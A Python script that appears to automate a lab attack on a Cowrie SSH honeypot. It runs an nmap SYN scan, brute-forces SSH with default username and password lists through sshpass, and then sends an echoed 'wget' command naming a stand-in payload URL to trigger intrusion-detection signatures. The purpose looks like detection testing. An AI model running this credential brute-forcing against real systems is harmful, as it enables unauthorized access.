#!/usr/bin/env python3
import subprocess, logging, time, os

os.makedirs("logs", exist_ok=True)
logging.basicConfig(filename='logs/pentest.log', level=logging.INFO,
                    format='%(asctime)s %(levelname)s: %(message)s')

TARGET = "cowrie"
SSH_PORT = 2222

SSH_OPTS = (
    "-o StrictHostKeyChecking=no "
    "-o UserKnownHostsFile=/dev/null "
    "-o GlobalKnownHostsFile=/dev/null "
    "-o PreferredAuthentications=password "
    "-o PubkeyAuthentication=no "
    "-o NumberOfPasswordPrompts=1 "
    "-o ConnectTimeout=5 -o BatchMode=no"
)

found_user = None
found_pass = None

def run_cmd(cmd, timeout=30):
    logging.info(f"RUN: {cmd}")
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        if p.stdout:
            logging.info(p.stdout.strip())
        if p.stderr:
            logging.warning(p.stderr.strip())
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        logging.exception("Erreur commande")
        return -1, str(e)

def syn_scan():
    return run_cmd(f"nmap -sS -p {SSH_PORT} --min-rate 200 {TARGET}")

def ssh_bruteforce():
    global found_user, found_pass
    users = ["root","admin","user"]
    passwords = ["1234","password","toor","admin","root"]
    for u in users:
        for p in passwords:
            cmd = f"sshpass -p '{p}' ssh {SSH_OPTS} -p {SSH_PORT} {u}@{TARGET} echo OK"
            rc, out = run_cmd(cmd, timeout=10)
            if rc == 0 and "OK" in out:
                logging.info(f"Successful login {u}/{p}")
                found_user, found_pass = u, p
                return True
    logging.info("No successful brute-force login")
    return False

'''def payload_detectable():
    """
    Envoie une commande contenant 'wget' pour déclencher la signature côté NIDS.
    Si brute-force a réussi, on réutilise les creds. Sinon on tente une petite liste.
    """
    candidates = []
    if found_user and found_pass:
        candidates.append((found_user, found_pass))
    else:
        candidates = [("root","1234"), ("root","toor"), ("admin","admin"), ("user","password")]

    for u, p in candidates:
        cmd = f"sshpass -p '{p}' ssh {SSH_OPTS} -p {SSH_PORT} {u}@{TARGET} 'echo wget http://example.invalid/payload || true'"
        rc, out = run_cmd(cmd, timeout=10)
        # Peu importe rc: on veut juste QUE LA COMMANDE PASSE pour déclencher la détection
        if rc == 0 or "wget" in out:
            logging.info(f"Payload command sent via {u}/{p}")
            return True
    logging.info("Payload command could not be sent (no valid creds).")
    return False'''


def payload_detectable():
    cmd = (
        f"sshpass -p 'password' "
        f"ssh -tt "
        f"-o StrictHostKeyChecking=no "
        f"-o PreferredAuthentications=password,keyboard-interactive "
        f"-o PubkeyAuthentication=no "
        f"-o NumberOfPasswordPrompts=1 "
        f"-o ConnectTimeout=8 "
        f"-p {SSH_PORT} root@{TARGET} "
        f"\"sh -lc 'echo wget http://example.invalid/payload; echo DONE'\""
    )
    run_cmd(cmd, timeout=20)


def main():
    logging.info("=== Début pentest automatisé ===")
    syn_scan()
    time.sleep(1)
    ssh_bruteforce()
    time.sleep(1)
    payload_detectable()
    logging.info("=== Fin pentest automatisé ===")

if __name__ == "__main__":
    main()
